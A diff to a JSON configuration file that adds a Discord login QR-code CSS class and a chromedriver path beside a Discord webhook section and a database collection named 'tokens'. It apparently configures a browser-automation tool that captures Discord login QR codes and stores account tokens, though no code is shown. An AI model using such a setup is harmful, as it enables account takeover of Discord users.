@@ -6,8 +6,12 @@
         "collection":"tokens"
     },
     "discord":{
+        "qr_class":"qrCode-2R7t9S",
         "webhook_url":"",
         "weebhook_username":"",
         "weebhook_avatar":""
+    },
+    "chromedriver":{
+        "path":"/usr/bin/chromedriver"
     }
 }
